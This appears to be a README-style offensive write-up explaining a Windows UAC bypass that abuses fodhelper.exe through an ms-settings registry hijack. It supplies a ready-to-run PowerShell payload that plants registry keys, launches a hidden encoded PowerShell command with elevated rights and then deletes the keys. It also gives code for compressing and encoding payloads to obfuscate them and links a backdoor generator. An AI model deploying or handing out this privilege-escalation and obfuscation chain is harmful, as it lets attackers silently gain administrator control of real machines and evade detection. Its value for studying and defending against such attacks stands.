# Theory

> Unlock hidden doors with trust as your key

### Vulnerability

fodhelper.exe itself does not execute registry keys per se; However, it reads certain registry keys to determine its behavior. By misusing the "ms-settings" key, we can potentially get fodhelper to run values within a key

fodhelper.exe is designed to run with elevated privileges without prompting the user with a uac

### Raw Payload

```Powershell
$payload="powershell.exe -w h -NoP -NonI -Exec Bypass -enc $command"
reg add "HKCU\Software\Classes\.hacker\Shell\Open\command" /d $payload /f
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".hacker" /f

fodhelper.exe

Start-Sleep -s 3
reg delete "HKCU\Software\Classes\.hacker\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```
or
```Powershell
$payload="powershell.exe -w h -NoP -NonI -Exec Bypass -enc $command";reg add "HKCU\Software\Classes\.hacker\Shell\Open\command" /d $payload /f;reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".hacker" /f;fodhelper.exe;Start-Sleep -s 3;reg delete "HKCU\Software\Classes\.hacker\" /f;reg delete "HKCU\Software\Classes\ms-settings\" /f;
```

### Encryption and Encode

<b>I know it's corny, but compression is a form of encryption</b>

We want to compress and encode this command to where powershell can decompress

Compression often generates unwanted characters, so we will also encode after compressing

```python
# Please forgive me, I hate leaving comments
# The code should speak for itself

import gzip

def compress_and_base64(input):
    # Convert string to bytes
    bytes = input.encode('utf-8')

    # Initialize buffer
    buffer = io.BytesIO()

    # Compress stream with gzip
    with gzip.GzipFile(fileobj=buffer, mode='wb') as file:
        file.write(bytes)

    # Save stream to variable
    compressed = buffer.getvalue()

    # Encode, so invisble characters are saved
    encoded = base64.b64encode(compressed)

    # Convert bytes to string
    return encoded.decode('utf-8')
```

<b>Extraction Method</b>

```powershell
# Decode and Decompress
# Output will be a string

(New-Object IO.Compression.GZipStream(
    # Decode
    [System.IO.MemoryStream][Convert]::FromBase64String($COMPRESSED_DATA_HERE),

    # Decompress stream with gzip
    [System.IO.Compression.CompressionMode]::Decompress
) |

# % is shorthand for "foreach-object"
%{

    # Read from gzip stream, convert to ascii
    New-Object System.IO.StreamReader($_, [System.Text.Encoding]::ASCII)

# Convert all to single string
}).ReadToEnd() 
```

or

```powershell
(New-Object IO.Compression.GZipStream([System.IO.MemoryStream][Convert]::FromBase64String($COMPRESSED_DATA_HERE), [System.IO.Compression.CompressionMode]::Decompress) |%{New-Object System.IO.StreamReader($_, [System.Text.Encoding]::ASCII)}).ReadToEnd()
```

### Powershell Obfuscation Methods

<p>I'm not re-writing documentation for this, see link below</p>

[Powershell-Backdoor-Generator](https://github.com/jaekenji/PowerShell-Backdoor-Generator/)
